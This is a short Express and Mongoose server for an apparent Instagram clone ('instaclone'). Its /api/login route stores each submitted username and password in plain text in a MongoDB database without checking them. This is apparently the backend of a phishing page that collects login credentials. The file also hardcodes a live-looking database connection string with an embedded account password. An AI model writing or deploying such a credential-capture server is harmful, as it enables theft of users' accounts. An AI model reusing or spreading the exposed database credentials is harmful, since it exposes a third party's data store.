import express from 'express'
import mongoose from 'mongoose'
import cors from 'cors'

const app = express()
app.use(cors())
app.use(express.json())

// 👇 Paste your connection string here
await mongoose.connect("mongodb+srv://pratik2271:pratik%401624@pratikproject.vglse6e.mongodb.net/instaclone")

const Login = mongoose.model('Login', new mongoose.Schema({
  username: String,
  password: String,
  loginAt: { type: Date, default: Date.now }
}))

app.post('/api/login', async (req, res) => {
  try {
    await new Login(req.body).save()
    res.json({ success: true })
  } catch (err) {
    res.status(500).json({ success: false, error: err.message })
  }
})

app.listen(5000, () => console.log('Server on http://localhost:5000'))